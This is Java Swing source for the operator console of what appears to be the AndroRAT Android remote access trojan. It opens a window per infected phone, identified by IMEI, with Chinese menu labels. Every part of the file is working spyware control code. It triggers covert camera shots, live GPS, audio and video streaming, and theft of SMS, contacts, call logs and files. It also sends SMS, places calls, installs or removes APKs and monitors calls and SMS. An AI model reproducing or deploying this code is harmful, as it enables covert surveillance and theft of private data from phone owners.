package com.android.security.gui;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;

import javax.swing.BoxLayout;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.KeyStroke;
import javax.swing.border.EmptyBorder;

import com.android.security.gui.panel.AppListPanel;
import com.android.security.gui.panel.CallLogPanel;
import com.android.security.gui.panel.ColorPane;
import com.android.security.gui.panel.ContactPanel;
import com.android.security.gui.panel.FileTreePanel;
import com.android.security.gui.panel.HomePanel;
import com.android.security.gui.panel.MapPanel;
import com.android.security.gui.panel.MonitorPanel;
import com.android.security.gui.panel.PicturePanel;
import com.android.security.gui.panel.SMSLogPanel;
import com.android.security.gui.panel.SoundPanel;
import com.android.security.gui.panel.VideoPanel;
import com.android.security.inout.Protocol;
import com.android.security.packages.AdvancedInformationPacket;
import com.android.security.packages.CallPacket;
import com.android.security.packages.SMSPacket;
import com.android.security.utils.Contact;
import com.android.security.utils.MyAPP;
import com.android.security.utils.MyFile;

public class UserGUI extends JFrame implements WindowListener {
	
	/**
	 * 
	 */
	private static final long serialVersionUID = -5162587460359386260L;
	private JPanel contentPane;
	private JTabbedPane tabbedPane;
	
	private HomePanel homePanel;
	private MapPanel mapPanel;
	private SoundPanel soundPanel;
	private PicturePanel picturePanel;
	private FileTreePanel fileTreePanel;
	private CallLogPanel callLogPanel;
	private ContactPanel contactPanel;
	private MonitorPanel monitorCall, monitorSMS;
	private VideoPanel videoPanel;
	private ColorPane userLogPanel;
	private SMSLogPanel smsPanel;
	private AppListPanel  appListPanel;
	
	private HashMap<JPanel, Integer> panChanMap;
	
	private String imei;
	private GUI gui;
	
	public UserGUI(String imei, GUI gui) {
		setIconImage(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/com/android/security/gui/res/androrat_logo_32pix.png")));
		this.imei = imei;
		this.gui = gui;
		
		panChanMap = new HashMap<JPanel, Integer>();
		
		this.initGUI();
		
		this.setLocationRelativeTo(null);
		this.setTitle("IMEI用户界面: "+imei);
		this.setVisible(true);
		this.setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		this.fireGetAdvancedInformations();
	}
	
	public void launchMessageDialog(String txt, String title, int type) {
		JOptionPane.showMessageDialog(this,txt,title,type);
	}
	
	@Override
	public void windowClosing(WindowEvent e) {
		System.out.println("关闭用户窗口");
		if(mapPanel != null) {
			if(mapPanel.getStreaming()) gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
		}
		if(soundPanel != null) {
			if(soundPanel.getStreaming()) gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
		}
		if(monitorCall != null) {
			if(monitorCall.getMonitoring()) gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
		}
		if(monitorSMS != null) {
			if(monitorSMS.getMonitoring()) gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
		}
		if(videoPanel != null) {
			if(videoPanel.getStreaming()) gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
		}
		gui.closeUserGUI(imei);
	}
	
	public void removeTab(JPanel viewer) {
		if(viewer instanceof MapPanel) {
			if(mapPanel.getStreaming()) gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
			mapPanel = null;
		}
		if(viewer instanceof SoundPanel) {
			if(soundPanel.getStreaming()) gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
			soundPanel = null;
		}
		if(viewer instanceof VideoPanel) {
			if(videoPanel.getStreaming()) gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
			videoPanel = null;
		}
		if(viewer instanceof PicturePanel) picturePanel = null;
		if(viewer instanceof FileTreePanel) fileTreePanel = null;
		if(viewer instanceof CallLogPanel) callLogPanel = null;
		if(viewer instanceof SMSLogPanel) smsPanel = null;
		if(viewer instanceof ContactPanel) contactPanel = null;
		if(viewer instanceof AppListPanel) appListPanel = null;
		if(viewer instanceof MonitorPanel) {
			if(((MonitorPanel) viewer).getCallMonitor()) {
				if(monitorCall.getMonitoring()) gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
				monitorCall = null;
			} else {
				if(monitorSMS.getMonitoring()) gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
				monitorSMS = null;
			}
		}
		tabbedPane.remove(viewer);
	}
	
	
	// ********************
	// M�thodes pour home
	// ********************
	
	
	public void updateHomeInformations(AdvancedInformationPacket packet) {
		homePanel.updateInformations(packet);
	}
	
	public void updatePreference(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		homePanel.updatePreferences(ip, port, wait, phones, sms, kw);
	}
	
	public void fireGetAdvancedInformations() {
		gui.fireGetAdvInformations(imei);
	}
	
	public void fireSaveConnectConfigurations(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		gui.fireSaveConnectConfiguration(imei, ip, port, wait, phones, sms, kw);
	}
	
	
	
	// ********************
	// M�thodes pour la Map
	// ********************
	
	public void updateMap(double lon, double lat, double alt, float speed, float accuracy) {
		if(mapPanel != null) mapPanel.updateMap(lon, lat, alt, speed, accuracy);
	}
	
	public void fireStartGPSStreaming(String provider) {
		gui.fireStartGPSStreaming(imei, provider);
	}
	
	public void fireStopGPSStreaming() {
		gui.fireStopGPSStreaming(imei, panChanMap.get(mapPanel));
	}
	
	
	// *********************
	// M�thodes pour l'image
	// *********************
	
	public void updatePicture(byte[] picture) {
		if(picturePanel != null) picturePanel.updateImage(picture);
	}
	
	public void fireTakePicture() {
		gui.fireTakePicture(imei);
	}
	
	
	// *********************
	// M�thodes pour le son
	// *********************
	
	public void addSoundBytes(byte[] data) {
		if(soundPanel != null) soundPanel.addSoundBytes(data);
	}
	
	public void fireStartSoundStreaming(int source) {
		gui.fireStartSoundStreaming(imei, source);
	}
	
	public void fireStopSoundStreaming() {
		gui.fireStopSoundStreaming(imei, panChanMap.get(soundPanel));
	}
	
	
	// ****************************
	// M�thodes pour la video
	// ****************************
	
	
	public void addVideoBytes(byte[] data) {
		if(videoPanel != null)
			videoPanel.addVideoBytes(data);
	}
	
	public void fireStartVideoStream() {
		gui.fireStartVideoStream(imei);
	}
	
	public void fireStopVideoStream() {
		gui.fireStopVideoStream(imei, panChanMap.get(videoPanel));
	}
	
	
	// ****************************
	// M�thodes pour l'arborescence
	// ****************************
	
	public void updateFileTree(ArrayList<MyFile> fileList) {
		if(fileTreePanel != null) fileTreePanel.updateFileTree(fileList);
	}
	
	public void fireFileDownload(String path, String downPath, String downName) {
		gui.fireFileDownload(imei, path, downPath, downName);
	}
	
	public void fireTreeFile() {
		gui.fireTreeFile(imei);
	}
	
	
	
	// ****************************
	// M�thodes pour les call logs
	// ****************************
	
	public void updateCallLogs(ArrayList<CallPacket> logsList) {
		if(callLogPanel != null) callLogPanel.updateCallLogs(logsList);
	}
	
	public void fireGetCallLogs(String request) {
		gui.fireCallLogs(imei, request);
	}
	
	
	// ****************************
	// M�thodes pour les SMS
	// ****************************
	
	public void updateSMS(ArrayList<SMSPacket> sms) {
		if(smsPanel != null) smsPanel.updateSMS(sms);
	}
	
	public void fireGetSMS(String request) {
		gui.fireGetSMS(imei, request);
	}
	
	
	// ****************************
	// M�thodes pour les contacts
	// ****************************
	
	public void updateContacts(ArrayList<Contact> contacts) {
		if(contactPanel != null) contactPanel.updateContactList(contacts);
	}
	
	public void fireGetContacts() {
		gui.fireContacts(imei);
	}
	
	public void fireGiveCall(String number) {
		gui.fireGiveCall(imei, number);
	}
	
	public void fireSendSMS(String number, String txt) {
		HashMap<String, String> map = new HashMap<String, String>();
		map.put(Protocol.KEY_SEND_SMS_NUMBER, number);
		map.put(Protocol.KEY_SEND_SMS_BODY, txt);
		gui.fireSendSMS(imei, map);
	}
	
	
	// ****************************
	// M�thodes pour monitors
	// ****************************
	
	public void addMonitoredCall(int type, String phoneNumber) {
		if(monitorCall != null) monitorCall.addMonitoredCall(type, phoneNumber);
	}
	
	public void addMonitoredSMS(String addr, long date, String body) {
		if(monitorSMS != null) monitorSMS.addMonitoredSMS(addr, date, body);
	}
	
	public void fireStartCallMonitoring(HashSet<String> phoneNumbers) {
		gui.fireStartCallMonitoring(imei, phoneNumbers);
	}
	
	public void fireStopCallMonitoring() {
		gui.fireStopCallMonitoring(imei, panChanMap.get(monitorCall));
	}
	
	public void fireStartSMSMonitoring(HashSet<String> phoneNumbers) {
		gui.fireStartSMSMonitoring(imei, phoneNumbers);
	}
	
	public void fireStopSMSMonitoring() {
		gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
	}
	
	
	// ****************************
	// M�thodes de save channel
	// ****************************
	
	public void saveMapChannel(int channel) {
    	panChanMap.put(mapPanel, channel);
    }
    
    public void saveCallLogChannel(int channel) {
    	panChanMap.put(callLogPanel, channel);
    }
    
    public void saveContactChannel(int channel) {
    	panChanMap.put(contactPanel, channel);
    }
    
    public void saveMonitorSMSChannel(int channel) {
    	panChanMap.put(monitorSMS, channel);
    }
    
    public void saveMonitorCallChannel(int channel) {
    	panChanMap.put(monitorCall, channel);
    }
    
    public void savePictureChannel(int channel) {
    	panChanMap.put(picturePanel, channel);
    }
    
    public void saveSoundChannel(int channel) {
    	panChanMap.put(soundPanel, channel);
    }
    
    public void saveVideoChannel(int channel) {
    	panChanMap.put(videoPanel, channel);
    }
	
	
	// ****************************
	// M�thodes des boutons UserGUI
	// ****************************
	
	private void fireButtonTakePicture() {
		if(picturePanel == null) {
			picturePanel = new PicturePanel(this);
			tabbedPane.addTab("图片浏览", picturePanel);
		}
		tabbedPane.setSelectedComponent(picturePanel);
	}
	
	private void fireButtonFileTree() {
		if(fileTreePanel == null) {
			fileTreePanel = new FileTreePanel(this);
			tabbedPane.addTab("目录树浏览", fileTreePanel);
		}
		tabbedPane.setSelectedComponent(fileTreePanel);
	}
	
	private void fireButtonAppList() {
		
		gui.logTxt("Get App List ");
		if(appListPanel == null) {
			appListPanel = new AppListPanel(this);
			tabbedPane.addTab("程序列表", appListPanel);
		}
		
		gui.logTxt("Get App List 1");
		tabbedPane.setSelectedComponent(appListPanel);
	}
	
	private void fireButtonCallLogs() {
		if(callLogPanel == null) {
			callLogPanel = new CallLogPanel(this);
			tabbedPane.addTab("呼叫记录", callLogPanel);
		}
		tabbedPane.setSelectedComponent(callLogPanel);
	}
	
	private void fireButtonContacts() {
		if(contactPanel == null) {
			contactPanel = new ContactPanel(this);
			tabbedPane.addTab("通讯录", contactPanel);
		}
		tabbedPane.setSelectedComponent(contactPanel);
	}
	
	private void fireButtonStreamingGPS() {
		gui.logTxt("Begin");
		if(mapPanel == null) {
			gui.logTxt("Begin1");
			mapPanel = new MapPanel(this);
			gui.logTxt("Begin2");
			tabbedPane.addTab("地理信息", mapPanel);
			gui.logTxt("Begin3");
		}
		gui.logTxt("Begin End");
		tabbedPane.setSelectedComponent(mapPanel);
	}
	
	private void fireButtonStreamingSound() {
		if(soundPanel == null) {
			soundPanel = new SoundPanel(this);
			tabbedPane.addTab("声音监控", soundPanel);
		}
		tabbedPane.setSelectedComponent(soundPanel);
	}
	
	private void fireButtonStreamingVideo() {
		if(videoPanel == null) {
			videoPanel = new VideoPanel(this);
			tabbedPane.addTab("视频播放", videoPanel);
		}
		tabbedPane.setSelectedComponent(videoPanel);
	}
	
	private void fireButtonSMS() {
		if(smsPanel == null) {
			smsPanel = new SMSLogPanel(this);
			tabbedPane.addTab("短信查看", smsPanel);
		}
		tabbedPane.setSelectedComponent(smsPanel);
	}
	
	private void fireButtonToastMessage() {
		String txt = JOptionPane.showInputDialog(this, "输入内容:");
		gui.fireToastMessage(imei, txt);
	}
	
	private void fireButtonFinish() {
		this.windowClosing(null);
		this.dispose();
	}
	
	public void fireButtonCloseTab() {
		JPanel panel = (JPanel) tabbedPane.getSelectedComponent();
		if(panel == homePanel) {
			JOptionPane.showMessageDialog(this,"不能关闭主标签","禁止操作",JOptionPane.ERROR_MESSAGE);
		} else {
			this.removeTab(panel);
		}
	}
	
	private void fireButtonSendSMS() {
		SMSDialog dialog = new SMSDialog(this);
		String[] res = dialog.showDialog();
		if(res != null) {
			HashMap<String, String> map = new HashMap<String, String>();
			map.put(Protocol.KEY_SEND_SMS_NUMBER, res[0]);
			map.put(Protocol.KEY_SEND_SMS_BODY, res[1]);
			gui.fireSendSMS(imei, map);
		}
	}
	
	private void fireButtonGiveCall() {
		String target = JOptionPane.showInputDialog(this, "输入被叫号码:");
		if(target != null) gui.fireGiveCall(imei, target);
	}
	
	private void fireButtonMonitorCall() {
		if(monitorCall == null) {
			monitorCall = new MonitorPanel(this, true);
			tabbedPane.addTab("呼叫监控", monitorCall);
		}
		tabbedPane.setSelectedComponent(monitorCall);
	}
	
	private void fireButtonMonitorSMS() {
		if(monitorSMS == null) {
			monitorSMS = new MonitorPanel(this, false);
			tabbedPane.addTab("短信监控", monitorSMS);
		}
		tabbedPane.setSelectedComponent(monitorSMS);
	}
	
	

	public void urlDownloadFile(String urlString, String savePath) {
		gui.urlDownloadFile(imei, urlString, savePath);
	}

	public void installAPK(String path) {
		gui.installAPK(imei, path);
	}
	
	//-----------app-------------------
	public void getAPPList() {
		gui.getAPPList(imei);
	}

	public void updateAPPList(ArrayList<MyAPP> list) {
		if(appListPanel != null) appListPanel.updateAppList(list);
	}

	public void processAPP(String appName) {
		gui.processAPP(imei, appName);
	}

	public void uninstallAPP(String appName) {
		gui.uninstallAPP(imei, appName);
	}

	/**
	 * Create the frame.
	 * Don't touch the code !!
	 */
	private void initGUI() {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 672, 584);
		
		JMenuBar menuBar = new JMenuBar();
		setJMenuBar(menuBar);
		
		JMenu mnOptions = new JMenu("选项");
		menuBar.add(mnOptions);
		
		JMenuItem mntmCloseInterface = new JMenuItem("关闭窗口");
		mntmCloseInterface.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonFinish();
			}
		});
		
		JMenuItem mntmCloseTabViewer = new JMenuItem("关闭标签");
		mntmCloseTabViewer.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R, InputEvent.CTRL_MASK));
		mntmCloseTabViewer.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonCloseTab();
			}
		});
		mnOptions.add(mntmCloseTabViewer);
		mnOptions.add(mntmCloseInterface);
		
		JMenu mnRcuprationDeDonnes = new JMenu("获取远程数据");
		menuBar.add(mnRcuprationDeDonnes);
		
		JMenuItem mntmPrendrePhoto = new JMenuItem("拍照");
		mnRcuprationDeDonnes.add(mntmPrendrePhoto);
		mntmPrendrePhoto.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonTakePicture();
			}
		});
		
		JMenuItem mntmAppList = new JMenuItem("程序列表");
		mnRcuprationDeDonnes.add(mntmAppList);
		mntmAppList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonAppList();
			}
		});		
		
		JMenuItem mntmFileTree = new JMenuItem("目录树");
		mnRcuprationDeDonnes.add(mntmFileTree);
		mntmFileTree.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonFileTree();
			}
		});
		

		
		JMenuItem mntmContacts = new JMenuItem("通讯录");
		mnRcuprationDeDonnes.add(mntmContacts);
		mntmContacts.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonContacts();
			}
		});
		
		JMenuItem mntmCallLogs = new JMenuItem("呼叫记录");
		mnRcuprationDeDonnes.add(mntmCallLogs);
		mntmCallLogs.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonCallLogs();
			}
		});
		
		JMenuItem mntmSms = new JMenuItem("SMS");
		mntmSms.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				fireButtonSMS();
			}
		});
		mnRcuprationDeDonnes.add(mntmSms);
		
		JMenu mnStreaming = new JMenu("实时监控");
		mnRcuprationDeDonnes.add(mnStreaming);
		
		JMenuItem mntmCoordonnesGps = new JMenuItem("地理信息");
		mntmCoordonnesGps.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				gui.logTxt("获取地址");
				fireButtonStreamingGPS();
			}
		});
		mnStreaming.add(mntmCoordonnesGps);
		
		JMenuItem mntmSon = new JMenuItem("声音");
		mntmSon.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingSound();
			}
		});
		mnStreaming.add(mntmSon);
		
		JMenuItem mntmVido = new JMenuItem("视频");
		mntmVido.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonStreamingVideo();
			}
		});
		mnStreaming.add(mntmVido);
		
		JMenu mnEnvoiDeCommandes = new JMenu("发送命令");
		menuBar.add(mnEnvoiDeCommandes);
		
		JMenuItem mntmSendToastMessage = new JMenuItem("屏幕消息");
		mntmSendToastMessage.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonToastMessage();
			}
		});
		mnEnvoiDeCommandes.add(mntmSendToastMessage);
		
		JMenuItem mntmSendSms = new JMenuItem("发送短信");
		mntmSendSms.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonSendSMS();
			}
		});
		mnEnvoiDeCommandes.add(mntmSendSms);
		
		JMenuItem mntmGiveCall = new JMenuItem("拨打电话");
		mntmGiveCall.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonGiveCall();
			}
		});
		mnEnvoiDeCommandes.add(mntmGiveCall);
		
		JMenu mnMonitoring = new JMenu("监控");
		menuBar.add(mnMonitoring);
		
		JMenuItem mntmCallMonitor = new JMenuItem("呼叫监控");
		mntmCallMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonMonitorCall();
			}
		});
		mnMonitoring.add(mntmCallMonitor);
		
		JMenuItem mntmSmsMonitor = new JMenuItem("短信监控");
		mntmSmsMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				fireButtonMonitorSMS();
			}
		});
		mnMonitoring.add(mntmSmsMonitor);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new BoxLayout(contentPane, BoxLayout.X_AXIS));
		
		JSplitPane splitPane = new JSplitPane();
		splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
		contentPane.add(splitPane);
		
		JScrollPane scrollPane = new JScrollPane();
		splitPane.setRightComponent(scrollPane);
		
        userLogPanel = new ColorPane();
        scrollPane.setViewportView(userLogPanel);
		
        //JTextArea textArea = new JTextArea();
		//scrollPane.setViewportView(textArea);
		
		tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		splitPane.setLeftComponent(tabbedPane);
		
		homePanel = new HomePanel(this);
		tabbedPane.addTab("主页", null, homePanel, null);
		
		//tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		//contentPane.add(tabbedPane);
		//splitPane.add(tabbedPane);
		
		addWindowListener(this);
	}

	@Override
	public void windowOpened(WindowEvent e) {
	}

	@Override
	public void windowClosed(WindowEvent e) {
	}

	@Override
	public void windowIconified(WindowEvent e) {
	}

	@Override
	public void windowDeiconified(WindowEvent e) {
	}

	@Override
	public void windowActivated(WindowEvent e) {
	}

	@Override
	public void windowDeactivated(WindowEvent e) {
	}
	
	public String getImei() {
		return imei;
	}
	
	public GUI getGUI() {
		return gui;
	}
	
    public void logTxt(long date, String txt) {
    	
    	java.text.DateFormat format1 = new java.text.SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        String stext = format1.format(new Date(date));
    	
    	userLogPanel.append(Color.black, (stext+ " "+txt+"\n"));
    }
    
    public void errLogTxt(long date, String txt) {
      	java.text.DateFormat format1 = new java.text.SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        String stext = format1.format(new Date(date));
    	    	
    	userLogPanel.append(Color.red, (stext+ " "+txt+"\n"));
    }


}
